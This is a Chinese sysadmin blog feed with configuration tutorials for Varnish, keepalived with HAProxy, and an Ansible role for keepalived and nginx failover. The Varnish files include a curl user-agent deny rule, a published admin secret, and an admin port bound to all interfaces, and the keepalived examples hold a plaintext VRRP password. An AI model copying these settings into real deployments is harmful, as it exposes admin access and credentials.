&quot;80&quot;;</span><br><span class="line">    .probe = http_chk;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_init &#123;</span><br><span class="line">    new websrvs = directors.random();</span><br><span class="line">    websrvs.add_backend(srv1, 1);</span><br><span class="line">    websrvs.add_backend(srv2, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">        set req.backend_hint = websrvs.backend();</span><br><span class="line">    if (req.restarts == 0) &#123;</span><br><span class="line">        if (req.http.X-Forwarded-For) &#123;</span><br><span class="line">            set req.http.X-Forwarded-For = req.http.X-Forwarded-For + &quot;,&quot; + client.ip;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            set req.http.X-Forwarded-For = client.ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(req.http.User-Agent ~ &quot;curl&quot;) &#123;</span><br><span class="line">        return(synth(403));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_backend_response &#123;</span><br><span class="line">    if (beresp.http.cache-control !~ &quot;s-maxage&quot;) &#123;</span><br><span class="line">        if (bereq.url ~ &quot;(?i)\.(jpg|jpeg|png|gif|css|js)$&quot;) &#123;</span><br><span class="line">            unset beresp.http.Set-Cookie;</span><br><span class="line">            set beresp.ttl = 3600s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_deliver &#123;</span><br><span class="line">    if (obj.hits&gt;0) &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;HIT via&quot; + &quot; &quot; + server.ip;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;MISS from &quot; + server.ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#-------------------------------------------------</span><br><span class="line">ansible-role-varnish/files/secret</span><br><span class="line">7e40f334-d2e7-4edb-aecb-559519e456f9</span><br><span class="line">ansible-role-varnish/files/varnish.params</span><br><span class="line">RELOAD_VCL=1</span><br><span class="line">VARNISH_VCL_CONF=/etc/varnish/default.vcl</span><br><span class="line">VARNISH_LISTEN_ADDRESS=0.0.0.0</span><br><span class="line">VARNISH_LISTEN_PORT=80</span><br><span class="line">VARNISH_ADMIN_LISTEN_ADDRESS=0.0.0.0</span><br><span class="line">VARNISH_ADMIN_LISTEN_PORT=6082</span><br><span class="line">VARNISH_SECRET_FILE=/etc/varnish/secret</span><br><span class="line">VARNISH_STORAGE=&quot;malloc,256M&quot;</span><br><span class="line">VARNISH_USER=varnish</span><br><span class="line">VARNISH_GROUP=varnish</span><br><span class="line">#DAEMON_OPTS=&quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300&quot;</span><br></pre></td></tr></table></figure><p>感谢阅读！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
      <category term="cache" scheme="https://fenghong.tech/tags/cache/"/>
    
  </entry>
  
  <entry>
    <title>KeepAlive</title>
    <link href="https://fenghong.tech/keepalive.html"/>
    <id>https://fenghong.tech/keepalive.html</id>
    <published>2018-07-11T11:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>HA cluster的概念</li><li>Keepalive的应用及配置</li><li>keepalived+haporxy实验</li><li>ansible+keepalived+nginx实验</li></ul><h1 id="HA-cluster"><a href="#HA-cluster" class="headerlink" title="HA cluster"></a>HA cluster</h1><p>​    HA是High Available缩写，是双机集群系统简称，指高可用性集群，是保证业务连续性的有效解决方案，一般有两个或两个以上的节点，且分为活动节点及备用节点。 </p><ul><li>LB：负载均衡集群</li></ul><blockquote><p>lvs负载均衡<br>nginx反向代理<br>HAProxy</p></blockquote><ul><li>HA：高可用集群</li></ul><blockquote><p>eartbeat<br>eepalived<br>edhat5 : cman + rgmanager , conga(WebGUI) –&gt; RHCS（Cluster Suite）集群套件<br>edhat6 : cman + rgmanager , corosync + pacemaker<br>edhat7 : corosync + pacemaker</p></blockquote><ul><li>HP：高性能集群</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &gt; total/2 with quorum</span><br><span class="line">&lt;= total/2 without quorum</span><br></pre></td></tr></table></figure><ul><li>heartbeat:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">heartbeat:</span><br><span class="line">heratbeat</span><br><span class="line">cluster-glye</span><br><span class="line">pacemaker</span><br><span class="line">corosync + pacemaker  (100个节点集群)</span><br><span class="line">STONITH: shooting the other node in the head</span><br><span class="line">cman + rgmanager</span><br></pre></td></tr></table></figure><h1 id="keepalive"><a href="#keepalive" class="headerlink" title="keepalive"></a>keepalive</h1><ul><li>keepalived的相关概念</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vrrp协议：Virtual Redundant Routing Protocol 虚拟冗余路由协议</span><br><span class="line">Virtual Router：虚拟路由器</span><br><span class="line">VRID(0-255)：虚拟路由器标识</span><br><span class="line">master：主设备，当前工作的设备</span><br><span class="line">backup：备用设备</span><br><span class="line">priority：优先级，优先级越大优先工作，具体情况示工作方式决定</span><br><span class="line">VIP：虚拟IP地址，正真向客户服务的IP地址</span><br><span class="line">VMAC：虚拟MAC地址(00-00-5e-00-01-VRID)</span><br><span class="line">抢占式：如果有优先级高的节点上线，则将此节点转为master</span><br><span class="line">非抢占式：即使有优先级高的节点上线，在当前master工作无故障的情况运行抢占；等到此master故障后重新按优先级选举master</span><br><span class="line">心跳：master将自己的心跳信息通知集群内的所有主机，证明自己正常工作</span><br><span class="line">安全认证机制：</span><br><span class="line">无认证：任何主机都可成为集群内主机，强烈不推荐</span><br><span class="line">简单的字符认证：使用简单的密码进行认证</span><br><span class="line">AH认证</span><br><span class="line">sync group：同步组，VIP和DIP配置到同一物理服务器上</span><br><span class="line">MULTICAST：组播，多播</span><br><span class="line">Failover：master故障，故障切换，故障转移</span><br><span class="line">Failback：故障节点重新上线，故障切回</span><br></pre></td></tr></table></figure><ul><li>keepalived的模型结构如下：</li></ul><p><img src="/images/1531276298776.png" alt="1531276298776"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y keepalived</span><br><span class="line">]# rpm -ql keepalived</span><br><span class="line">/etc/keepalived</span><br><span class="line">/etc/keepalived/keepalived.conf  #主配置文件       </span><br><span class="line">/etc/sysconfig/keepalived#uint files配置文件</span><br><span class="line">/usr/bin/genhash</span><br><span class="line">/usr/lib/systemd/system/keepalived.service#uint files</span><br><span class="line">/usr/libexec/keepalived</span><br><span class="line">/usr/sbin/keepalived#主程序文件</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>需开启<code>multicast</code>，基于多播模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]# ip link set dev ens33 multicast on #基于多播模式</span><br></pre></td></tr></table></figure><ul><li>全局配置段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">global_defs &#123;</span><br><span class="line">   notification_email &#123;  #发送通知email，收件人</span><br><span class="line">     acassen@firewall.loc</span><br><span class="line">     failover@firewall.loc</span><br><span class="line">     sysadmin@firewall.loc</span><br><span class="line">   &#125;</span><br><span class="line">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">   smtp_server 192.168.200.1  #邮件服务器地址</span><br><span class="line">   smtp_connect_timeout 30  #超时时长</span><br><span class="line">   router_id LVS_DEVEL  #路由器标识ID</span><br><span class="line">   vrrp_skip_check_adv_addr  #跳过的检查地址</span><br><span class="line">   vrrp_strict  #严格模式</span><br><span class="line">   vrrp_garp_interval 0  #免费arp</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>虚拟路由示例段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vrrp_instance &lt;STRING&gt; &#123;</span><br><span class="line">    state MASTER|BACKUP：#当前节点在此虚拟路由器上的初始状态；只能有一个是MASTER，余下的都应该为BACKUP；</span><br><span class="line">    interface IFACE_NAME：#绑定为当前虚拟路由器使用的物理接口；</span><br><span class="line">    virtual_router_id VRID：#当前虚拟路由器的惟一标识，范围是0-255；</span><br><span class="line">    priority 100：#当前主机在此虚拟路径器中的优先级；范围1-254；</span><br><span class="line">    advert_int 1：#vrrp通告的时间间隔；</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type AH|PASS #pass为简单认证</span><br><span class="line">        auth_pass &lt;PASSWORD&gt; #认证密码，8为密码</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;  #VIP配置</span><br><span class="line">        &lt;IPADDR&gt;/&lt;MASK&gt; brd &lt;IPADDR&gt; dev &lt;STRING&gt; scope &lt;SCOPE&gt; label &lt;LABEL&gt;</span><br><span class="line">        192.168.200.17/24 dev eth1</span><br><span class="line">        192.168.200.18/24 dev eth2 label eth2:1</span><br><span class="line">    &#125;</span><br><span class="line">    track_interface &#123;  #配置要监控的网络接口，一旦接口出现故障，则转为FAULT状态；</span><br><span class="line">        eth0</span><br><span class="line">        eth1</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    nopreempt：定义工作模式为非抢占模式；</span><br><span class="line">    preempt_delay 300：抢占式模式下，节点上线后触发新选举操作的延迟时长；</span><br><span class="line">    notify_master &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点成为主节点时触发的脚本；</span><br><span class="line">    notify_backup &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点转为备节点时触发的脚本；</span><br><span class="line">    notify_fault &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点转为“失败”状态时触发的脚本；</span><br><span class="line">    notify &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：通用格式的通知触发机制，一个脚本可完成以上三种状态的转换时的通知；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>虚拟服务器配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> delay_loop &lt;INT&gt;：服务轮询的时间间隔；</span><br><span class="line"> lb_algo rr|wrr|lc|wlc|lblc|sh|dh：定义调度方法；</span><br><span class="line"> lb_kind NAT|DR|TUN：集群的类型；</span><br><span class="line"> persistence_timeout &lt;INT&gt;：持久连接时长；</span><br><span class="line"> protocol TCP：服务协议，仅支持TCP；</span><br><span class="line">sorry_server &lt;IPADDR&gt; &lt;PORT&gt;：备用服务器地址；</span><br><span class="line">real_server &lt;IPADDR&gt; &lt;PORT&gt;</span><br><span class="line">&#123;</span><br><span class="line"> weight &lt;INT&gt;</span><br><span class="line"> notify_up &lt;STRING&gt;|&lt;QUOTED-STRING&gt;</span><br><span class="line"> notify_down &lt;STRING&gt;|&lt;QUOTED-STRING&gt;</span><br><span class="line"> HTTP_GET|SSL_GET|TCP_CHECK|SMTP_CHECK|MISC_CHECK &#123; ... &#125;：定义当前主机的健康状态检测方法；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HTTP_GET|SSL_GET：应用层检测</span><br><span class="line"></span><br><span class="line">HTTP_GET|SSL_GET &#123;</span><br><span class="line">url &#123;</span><br><span class="line">path &lt;URL_PATH&gt;：定义要监控的URL；</span><br><span class="line">status_code &lt;INT&gt;：判断上述检测机制为健康状态的响应码；</span><br><span class="line">digest &lt;STRING&gt;：判断上述检测机制为健康状态的响应的内容的校验码；</span><br><span class="line">&#125;</span><br><span class="line">nb_get_retry &lt;INT&gt;：重试次数；</span><br><span class="line">delay_before_retry &lt;INT&gt;：重试之前的延迟时长；</span><br><span class="line">connect_ip &lt;IP ADDRESS&gt;：向当前RS的哪个IP地址发起健康状态检测请求</span><br><span class="line">connect_port &lt;PORT&gt;：向当前RS的哪个PORT发起健康状态检测请求</span><br><span class="line">bindto &lt;IP ADDRESS&gt;：发出健康状态检测请求时使用的源地址；</span><br><span class="line">bind_port &lt;PORT&gt;：发出健康状态检测请求时使用的源端口；</span><br><span class="line">connect_timeout &lt;INTEGER&gt;：连接请求的超时时长；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> TCP_CHECK &#123;</span><br><span class="line">connect_ip &lt;IP ADDRESS&gt;：向当前RS的哪个IP地址发起健康状态检测请求</span><br><span class="line">connect_port &lt;PORT&gt;：向当前RS的哪个PORT发起健康状态检测请求</span><br><span class="line">bindto &lt;IP ADDRESS&gt;：发出健康状态检测请求时使用的源地址；</span><br><span class="line">bind_port &lt;PORT&gt;：发出健康状态检测请求时使用的源端口；</span><br><span class="line">connect_timeout &lt;INTEGER&gt;：连接请求的超时时长；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>脚本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vrrp_script &lt;SCRIPT_NAME&gt; &#123;</span><br><span class="line">    script &quot;&quot;  #定义执行脚本</span><br><span class="line">    interval INT  #多长时间检测一次</span><br><span class="line">    weight -INT  #如果脚本的返回值为假，则执行权重减N的操作</span><br><span class="line">    rise 2  #检测2次为真，则上线</span><br><span class="line">    fall 3  #检测3次为假，则下线</span><br><span class="line">&#125;</span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    track_script &#123;  #在虚拟路由实例中调用此脚本</span><br><span class="line">        SCRIPT_NAME_1</span><br><span class="line">        SCRIPT_NAME_2</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>ipvs+keepalive</code>的配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">virtual_server IP port|</span><br><span class="line">virtual_server fwmark int</span><br><span class="line">&#123;</span><br><span class="line">    ···</span><br><span class="line">    real_server&#123;</span><br><span class="line">        ···</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="keepalived-HAproxy"><a href="#keepalived-HAproxy" class="headerlink" title="keepalived+HAproxy"></a>keepalived+HAproxy</h1><p>环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.10:80</span><br><span class="line">192.168.0.11:80</span><br><span class="line">192.168.0.12:80</span><br><span class="line">三台web服务器已经搭好</span><br><span class="line">]# yum install -y httpd</span><br><span class="line">]# echo `hostname` &gt; /var/www/html/index.html</span><br><span class="line">]# systemctl start httpd</span><br></pre></td></tr></table></figure><ul><li>配置HAProxy，两台主机一样的配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">frontend web *:80</span><br><span class="line">    default_backend websrvs</span><br><span class="line">backend websrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server srv1 192.168.0.10:80 check</span><br><span class="line">    server srv2 192.168.0.11:80 check</span><br><span class="line">    server srv3 192.168.0.12:80 check</span><br></pre></td></tr></table></figure><ul><li>配置keepalived实现高可用，一台为MASTER一台为BACKUP.</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/keepalived/keepalived.conf</span><br><span class="line">! Configuration File for keepalived</span><br><span class="line">global_defs &#123;</span><br><span class="line">   notification_email &#123;</span><br><span class="line">     root@localhost</span><br><span class="line">   &#125;</span><br><span class="line">   notification_email_from keepalived@localhoat</span><br><span class="line">   smtp_server 127.0.0.1</span><br><span class="line">   smtp_connect_timeout 30</span><br><span class="line">   router_id node1</span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">   vrrp_mcast_group4 224.0.111.111</span><br><span class="line">   vrrp_iptables</span><br><span class="line">&#125;</span><br><span class="line">vrrp_script chk_haproxy &#123;</span><br><span class="line">        script &quot;killall -0 haproxy&quot;  #监控haproxy进程</span><br><span class="line">        interval 1</span><br><span class="line">        weight -5</span><br><span class="line">        fall 2</span><br><span class="line">        rise 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_down &#123;</span><br><span class="line">    script &quot;/bin/bash -c &apos;[[ -f /etc/keepalived/down ]]&apos; &amp;&amp; exit 1 || exit 0&quot;  #在keepalived中要特别地指明作为bash的参数的运行</span><br><span class="line">    interval 1</span><br><span class="line">    weight -10</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state MASTER#一台为BACKUP</span><br><span class="line">    interface eth0</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 100#当为BACKUP时，priority适当减少，建议95。</span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass fd57721a</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.0.2/24 dev eth0</span><br><span class="line">    &#125;</span><br><span class="line">    track_script &#123;  #调用监控脚本</span><br><span class="line">            chk_haproxy</span><br><span class="line">            chk_down</span><br><span class="line">    &#125;</span><br><span class="line">    notify_master &quot;/etc/keepalived/notify.sh master&quot;</span><br><span class="line">    notify_backup &quot;/etc/keepalived/notify.sh backup&quot;</span><br><span class="line">    notify_fault &quot;/etc/keepalived/notify.sh fault&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">测试：创建down文件后使得降优先级，从而使得VIP漂移到node2，进入维护模式</span><br><span class="line">]# touch /etc/keepalived/down</span><br></pre></td></tr></table></figure><h1 id="ansible实现双主keepalived-nginx反代"><a href="#ansible实现双主keepalived-nginx反代" class="headerlink" title="ansible实现双主keepalived+nginx反代"></a>ansible实现双主keepalived+nginx反代</h1><p>拓扑图：</p><p><img src="/images/1531399406134.png" alt="1531399406134"></p><p>环境：</p><ul><li>各节点时间必须同步；</li><li>确保iptables及selinux的正确配置；</li><li>各节点之间可通过主机名互相通信（对KA并非必须），建议使用/etc/hosts文件实现；</li><li>确保各节点的用于集群服务的接口支持MULTICAST通信；D类：224-239；<code>ip link set dev eth0 multicast off | on</code></li></ul><h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ul><li>主机配置及同步时间</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">]# ssh-keygen -t rsa</span><br><span class="line">]# ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.28</span><br><span class="line">]# ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.30</span><br><span class="line">]# vim /etc/ansible/hosts</span><br><span class="line">[nginx]</span><br><span class="line">192.168.1.30 state1=MASTER priority1=100 state2=BACKUP priority2=90#两套变量</span><br><span class="line">192.168.1.28 state1=BACKUP priority1=90 state2=MASTER priority2=100</span><br><span class="line">ansbile all -s  &apos;ntpdate 210.72.145.44 &apos; //是中国国家授时中心的官方服务器。</span><br></pre></td></tr></table></figure><ul><li>配置palybook的tasks任务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ansible/roles/nginx/tasks/main.yml</span><br><span class="line">- name: install package</span><br><span class="line">  yum: name=&#123;&#123; item &#125;&#125;</span><br><span class="line">  with_items:</span><br><span class="line">  - nginx</span><br><span class="line">  - keepalived</span><br><span class="line">- name: config keepalived</span><br><span class="line">  template: src=keepalived.conf.j2 dest=/etc/keepalived/keepalived.conf</span><br><span class="line">  notify: restart keepalived</span><br><span class="line">- name: file notify.sh</span><br><span class="line">  copy: src=notify.sh dest=/etc/keepalived/</span><br><span class="line">- name: config nginx</span><br><span class="line">  template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf</span><br><span class="line">  notify: restart nginx</span><br><span class="line">- name: start service</span><br><span class="line">  service: name=&#123;&#123; item &#125;&#125; state=started enabled=true</span><br><span class="line">  with_items:</span><br><span class="line">  - keepalived</span><br><span class="line">  - nginx</span><br></pre></td></tr></table></figure><ul><li>添加handlers</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ansible/roles/nginx/handlers/main.yml</span><br><span class="line">- name: restart keepalived</span><br><span class="line">  service: name=keepalived state=restarted</span><br><span class="line">- name: restart nginx</span><br><span class="line">  service: name=nginx state=restarted</span><br></pre></td></tr></table></figure><ul><li>准备keepalived配置文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; /app/keepalived.conf.j2  &lt;&lt;EOF</span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">    notification_email &#123;</span><br><span class="line">        root@localhost</span><br><span class="line">    &#125;</span><br><span class="line">    notification_email_from keepalived@localhost</span><br><span class="line">    smtp_server 127.0.0.1</span><br><span class="line">    smtp_connect_timeout 30</span><br><span class="line">    vrrp_iptables</span><br><span class="line">    router_id &#123;&#123; ansible_hostname &#125;&#125;</span><br><span class="line">    vrrp_mcast_group4 224.0.100.19</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_down &#123;</span><br><span class="line">    script &quot;/bin/bash -c &apos;[[ -f /etc/keepalived/down ]]&apos; &amp;&amp; exit 1 || exit 0&quot;</span><br><span class="line">    interval 1</span><br><span class="line">    weight -15</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_nginx &#123;</span><br><span class="line">    script &quot;killall -0 nginx &amp;&amp; exit 0 || exit 1&quot;</span><br><span class="line">    interval 1</span><br><span class="line">    weight -15</span><br><span class="line">    fall 2</span><br><span class="line">    rise 1</span><br><span class="line">&#125;</span><br><span 